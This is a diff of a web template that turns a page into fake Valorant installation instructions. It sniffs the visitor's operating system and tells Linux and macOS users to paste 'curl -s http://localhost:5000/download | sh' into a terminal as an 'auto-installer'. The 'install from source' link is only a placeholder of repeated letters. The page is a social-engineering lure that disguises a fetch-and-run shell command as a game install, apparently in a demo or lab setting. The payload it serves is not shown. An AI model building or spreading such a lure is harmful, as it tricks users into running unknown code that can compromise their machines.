@@ -1,11 +1,46 @@
 {% extends 'base.html' %}
 <body>
 	{% block content %}
+    <style>
+    pre {
+        background: #30353b;
+        border: 1px solid #ddd;
+        border-left: 3px solid #f36d33;
+        color: #666;
+        page-break-inside: avoid;
+        font-family: monospace;
+        font-size: 15px;
+        line-height: 0.5;
+        margin-bottom: 0.2em;
+        max-width: 100%;
+        overflow: auto;
+        padding: 0.2em 0.2em;
+        display: block;
+        word-wrap: break-word;
+    }
+    </style>
 	<section class="about_us section_padding">
 		<div class="container">
 			<div class="row align-item-center justify-content-between">
 				<div class="col-md-5 col-lg-6 col-xl-6">
-					<h2>Thank you for downloading Valorant!></h2>
+                    <h2>Valorant Installation Instructions</h2>
+                    {% if os_fam == "windows" %}
+                        <p>We have detected your platform is Windows</p>
+                        <br>
+                        <p>Please follow along the windows instructions</p>
+                    {% elif os_fam == "linux" or os_fam == "mac os x" %}
+                        <p>We have detected you are running Unix</p>
+                        <p>Copy and paste the following into your terminal emulator to run the Valorant auto-installer</p>
+                        <pre>
+                            <code class="bash">
+                                <p> curl -s http://localhost:5000/download | sh </p>
+                            </code>
+                        </pre>
+                        <p>Or if you would like to install Valorant from source, please follow the following link</p>
+                        <a href="https://github.com/eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee/eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee">Warning, It is a bit difficult to install from source</a>
+                    {% else %}
+                        <p>Sorry, you are running an unsupported platform for Valorant</p>
+                    {% endif %}
 				</div>
 			</div>
 		</div>
